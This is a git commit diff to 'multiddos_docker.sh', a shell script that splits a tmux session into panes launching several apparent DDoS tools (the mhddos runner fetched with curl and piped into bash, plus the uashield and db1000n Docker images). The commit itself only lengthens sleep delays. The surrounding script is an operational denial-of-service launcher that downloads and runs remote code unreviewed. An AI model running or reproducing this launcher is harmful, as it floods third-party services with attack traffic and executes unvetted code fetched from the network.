2b28e71735f13daa73358063ace24f1a71d3a66f
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-07 22:00:29 +0300

    Update multiddos_docker.sh

--- multiddos_docker.sh
+++ multiddos_docker.sh
@@ -22,12 +22,12 @@ mkdir multiddos
 cd multiddos
 
 tmux new-session -s multiddos -d 'gotop -asc solarized'
-sleep 0.1
+sleep 0.3
 tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
-sleep 0.1
+sleep 0.3
 #tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
-sleep 0.1
+sleep 0.3
 tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux -2 attach-session -d
